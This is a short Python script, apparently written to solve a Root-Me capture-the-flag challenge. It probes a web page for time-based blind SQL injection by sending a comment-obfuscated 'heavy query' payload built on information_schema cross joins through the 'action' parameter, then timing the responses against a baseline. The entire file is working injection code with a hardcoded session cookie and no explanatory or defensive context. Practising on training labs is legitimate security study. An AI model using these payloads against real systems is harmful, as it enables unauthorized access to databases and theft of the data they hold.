import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_time_based(payload):
    """Prueba payload time-based en action"""
    full_payload = f"login'/**/AND/**/{payload}/**/-- -"
    params = {"action": full_payload}
    
    inicio = time.time()
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        return tiempo
    except Exception as e:
        return 0

print("="*70)
print("  PROBANDO HEAVY QUERY CON INFORMATION_SCHEMA")
print("="*70)

# Heavy query base
heavy = "(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns,information_schema.columns/**/T1)"

# Probar si la heavy query funciona
print("\n[1] Probando heavy query...")
t = test_time_based(f"1=1/**/AND/**/{heavy}")
print(f"  Tiempo: {t:.2f}s")

# Comparar con baseline
t_baseline = test_time_based("1=1")
print(f"  Baseline: {t_baseline:.2f}s")

if t > t_baseline + 2:
    print("  ✅ ¡Heavy query funciona!")
else:
    print("  ❌ Heavy query no funciona o es muy rápida")
